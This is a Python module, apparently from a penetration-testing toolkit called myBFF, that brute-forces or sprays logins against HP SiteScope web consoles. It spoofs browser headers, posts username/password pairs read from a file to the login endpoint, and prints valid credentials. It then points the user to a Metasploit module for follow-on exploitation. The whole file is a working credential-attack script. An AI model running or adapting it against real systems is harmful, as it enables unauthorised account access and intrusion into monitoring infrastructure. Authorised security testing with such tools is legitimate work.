#! /bin/python
# Created by Kirk Hayes (l0gan) @kirkphayes
# Part of myBFF
from requests import session
import requests
import re
from argparse import ArgumentParser

class SiteScopeBrute():
    def connectTest(self, config, payload):
        with session() as c:
            resp1 = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/SiteScope/')
            cookie1 = resp1.cookies['JSESSIONID']
            cookies = dict(JSESSIONID=cookie1)
            c.headers.update({'Host': config["HOST"] + ':' + config["port"], 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/SiteScope/servlet/Main', 'Accept-Language': 'en-US,en;q=0.5'})
            c.cookies.clear()
            cpost = c.post(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/SiteScope/j_security_check', cookies=cookies, data=payload, allow_redirects=True)
            m = re.search("Incorrect user name or password", cpost.text)
            if m:
                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
            else:
                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"] + ". Now go run the SiteScope Metasploit Module! :-)")
    def payload(self, config):
        if config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
            for line in lines:
                config["USERNAME"] = line.strip('\n')
                payload = {
                    'j_username': config["USERNAME"],
                    'j_password': config["PASSWORD"]
                    }
                self.connectTest(config, payload)
        else:
            payload = {
                'j_username': config["USERNAME"],
                'j_password': config["PASSWORD"]
            }
            self.connectTest(config, payload)
